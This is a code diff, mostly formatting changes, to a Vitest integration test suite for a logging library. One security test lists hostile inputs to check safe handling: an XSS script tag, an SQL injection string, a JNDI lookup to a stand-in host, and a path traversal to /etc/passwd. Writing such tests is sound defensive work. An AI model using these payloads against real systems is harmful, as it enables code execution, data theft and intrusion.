@@ -1,4 +1,4 @@
-import { describe, it, expect, vi, beforeEach } from 'vitest';
+import { beforeEach, describe, expect, it, vi } from 'vitest';
 import { LogLevel } from '../src/core/types.ts';
 import { filterSensitiveData } from '../src/utils/serialization.ts';
 
@@ -11,9 +11,9 @@ vi.mock('../src/utils/runtime.ts', () => ({
       fileSystem: true,
       colorSupport: true,
       processInfo: true,
-      streams: true
-    }
-  })
+      streams: true,
+    },
+  }),
 }));
 
 import { createLogger, createLoggerForEnvironment } from '../src/index.ts';
@@ -26,14 +26,14 @@ describe('Integration Tests', () => {
 
   describe('End-to-end logging workflow', () => {
     it.skip('should handle complete logging workflow', () => {
-      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => { });
+      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => {});
 
       // Create logger with custom config
       const logger = createLogger({
         level: LogLevel.DEBUG,
         timestamp: true,
         colorize: false,
-        metadata: { service: 'test-app', version: '1.0.0' }
+        metadata: { service: 'test-app', version: '1.0.0' },
       });
 
       // Create child logger with additional context
@@ -59,7 +59,7 @@ describe('Integration Tests', () => {
     });
 
     it('should handle error logging with stack traces', () => {
-      const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => { });
+      const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
 
       const logger = createLogger({ level: LogLevel.DEBUG });
 
@@ -69,7 +69,7 @@ describe('Integration Tests', () => {
         logger.error('Application error occurred', {
           error,
           operation: 'database_connect',
-          timestamp: new Date().toISOString()
+          timestamp: new Date().toISOString(),
         });
       }
 
@@ -82,7 +82,7 @@ describe('Integration Tests', () => {
     });
 
     it('should handle high-volume logging efficiently', () => {
-      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => { });
+      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => {});
 
       const logger = createLogger({ level: LogLevel.INFO });
 
@@ -93,7 +93,7 @@ describe('Integration Tests', () => {
         logger.info(`Message ${i}`, {
           iteration: i,
           batch: Math.floor(i / 100),
-          data: { nested: { deep: `value-${i}` } }
+          data: { nested: { deep: `value-${i}` } },
         });
       }
 
@@ -107,7 +107,7 @@ describe('Integration Tests', () => {
     });
 
     it('should handle complex metadata objects', () => {
-      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => { });
+      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => {});
 
       const logger = createLogger();
 
@@ -119,27 +119,27 @@ describe('Integration Tests', () => {
             preferences: {
               theme: 'dark',
               notifications: true,
-              features: ['feature-a', 'feature-b']
-            }
-          }
+              features: ['feature-a', 'feature-b'],
+            },
+          },
         },
         request: {
           headers: {
             'user-agent': 'Mozilla/5.0...',
-            'accept': 'application/json'
+            accept: 'application/json',
           },
           body: {
             query: 'search term',
             filters: {
               category: 'electronics',
-              price: { min: 10, max: 100 }
-            }
-          }
+              price: { min: 10, max: 100 },
+            },
+          },
         },
         performance: {
           startTime: Date.now(),
-          memory: process.memoryUsage?.() || {}
-        }
+          memory: process.memoryUsage?.() || {},
+        },
       };
 
       logger.info('Complex operation completed', complexMetadata);
@@ -168,8 +168,8 @@ describe('Integration Tests', () => {
             fileSystem: runtimeName !== 'browser',
             colorSupport: true,
             processInfo: runtimeName !== 'browser',
-            streams: runtimeName !== 'browser'
-          }
+            streams: runtimeName !== 'browser',
+          },
         });
 
         const logger = createLogger({ level: LogLevel.INFO });
@@ -184,7 +184,7 @@ describe('Integration Tests', () => {
     it('should handle environment-based configuration across runtimes', () => {
       const environments = ['production', 'development', 'staging', 'test'];
 
-      environments.forEach(env => {
+      environments.forEach((env) => {
         const originalEnv = process.env.NODE_ENV;
         process.env.NODE_ENV = env;
 
@@ -255,7 +255,7 @@ describe('Integration Tests', () => {
 
     it('should handle concurrent logging scenarios', async () => {
       // Create spy before logger to ensure it captures all calls
-      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => { });
+      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => {});
 
       const logger = createLogger({ level: LogLevel.INFO });
 
@@ -265,7 +265,7 @@ describe('Integration Tests', () => {
         Promise.resolve().then(() => {
           logger.info(`Concurrent message ${i}`, {
             threadId: i,
-            timestamp: Date.now()
+            timestamp: Date.now(),
           });
         })
       );
@@ -282,7 +282,7 @@ describe('Integration Tests', () => {
 
   describe('Security and data protection', () => {
     it('should filter sensitive data in logs', () => {
-      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => { });
+      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => {});
 
       const logger = createLogger();
 
@@ -292,12 +292,16 @@ describe('Integration Tests', () => {
         apiKey: 'api_key_12345',
         token: 'bearer_token_xyz',
         creditCard: '4111-1111-1111-1111',
-        ssn: '123-45-6789'
+        ssn: '123-45-6789',
       };
 
       // Filter sensitive data before logging
       const filteredData = filterSensitiveData(sensitiveData, [
-        'password', 'apiKey', 'token', 'creditCard', 'ssn'
+        'password',
+        'apiKey',
+        'token',
+        'creditCard',
+        'ssn',
       ]);
 
       logger.info('User data processed', filteredData);
@@ -313,13 +317,14 @@ describe('Integration Tests', () => {
     });
 
     it('should handle potentially malicious input safely', () => {
-      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => { });
+      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => {});
 
       const logger = createLogger();
 
       const maliciousInputs = [
         '<script>alert("xss")</script>',
         '"; DROP TABLE users; --',
+        // biome-ignore lint/suspicious/noTemplateCurlyInString: Test string for JNDI injection
         '${jndi:ldap://malicious.com/a}',
         '../../../etc/passwd',
         'function(){while(true){}}()',
@@ -327,7 +332,7 @@ describe('Integration Tests', () => {
         new Date('invalid'),
         Infinity,
         -Infinity,
-        NaN
+        NaN,
       ];
 
       maliciousInputs.forEach((input, index) => {
@@ -346,7 +351,7 @@ describe('Integration Tests', () => {
       vi.doMock('../src/utils/runtime', () => ({
         detectRuntime: () => {
           throw new Error('Runtime detection failed');
-        }
+        },
       }));
 
       // Should not throw even if runtime detection fails
@@ -362,7 +367,7 @@ describe('Integration Tests', () => {
       global.console = {
         ...originalConsole,
         debug: undefined,
-        info: undefined
+        info: undefined,
       } as any;
 
       const logger = createLogger();
@@ -377,7 +382,7 @@ describe('Integration Tests', () => {
     });
 
     it('should handle circular references in complex scenarios', () => {
-      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => { });
+      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => {});
 
       const logger = createLogger();
 
@@ -405,7 +410,7 @@ describe('Integration Tests', () => {
 
   describe('Real-world usage patterns', () => {
     it('should support HTTP request logging pattern', () => {
-      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => { });
+      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => {});
 
       const logger = createLogger();
 
@@ -417,71 +422,71 @@ describe('Integration Tests', () => {
         method: 'POST',
         url: '/api/users',
         userAgent: 'Mozilla/5.0...',
-        ip: '192.168.1.100'
+        ip: '192.168.1.100',
       });
 
       requestLogger.info('Database query executed', {
         query: 'INSERT INTO users...',
         duration: 45,
-        rows: 1
+        rows: 1,
       });
 
       requestLogger.info('HTTP request completed', {
         statusCode: 201,
         responseTime: 156,
-        bytesOut: 1024
+        bytesOut: 1024,
       });
 
       expect(consoleSpy).toHaveBeenCalledTimes(3);
 
       // All logs should contain the request ID
-      consoleSpy.mock.calls.forEach(call => {
+      consoleSpy.mock.calls.forEach((call) => {
         expect(call[0]).toContain(requestId);
       });
     });
 
     it.skip('should support application lifecycle logging', () => {
-      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => { });
+      const consoleSpy = vi.spyOn(console, 'info').mockImplementation(() => {});
 
       const logger = createLogger({
         metadata: {
           app: 'test-service',
           version: '1.2.3',
-          environment: 'production'
-        }
+          environment: 'production',
+        },
       });
 
       // Application startup
       logger.info('Application starting', {
         nodeVersion: process.version,
         platform: process.platform,
-        pid: process.pid
+        pid: process.pid,
       });
 
       // Service initialization
       logger.info('Database connected', {
         host: 'localhost',
         database: 'app_db',
-        connectionPool: { min: 2, max: 10 }
+        connectionPool: { min: 2, max: 10 },
       });
 
       logger.info('Redis connected', {
         host: 'localhost',
         port: 6379,
-        keyspace: 'app:'
+        keyspace: 'app:',
       });
 
       // Ready to serve
       logger.info('Application ready', {
         port: 3000,
         routes: 25,
-        middleware: ['cors', 'auth', 'logging']
+        middleware: ['cors', 'auth', 'logging'],
       });
 
       expect(consoleSpy).toHaveBeenCalledTimes(4);
 
       // All logs should contain app metadata
-      consoleSpy.mock.calls.forEach(call => {
+      consoleSpy.mock.calls.forEach((call) => {
         expect(call[0]).toContain('test-service');
         expect(call[0]).toContain('1.2.3');
       });
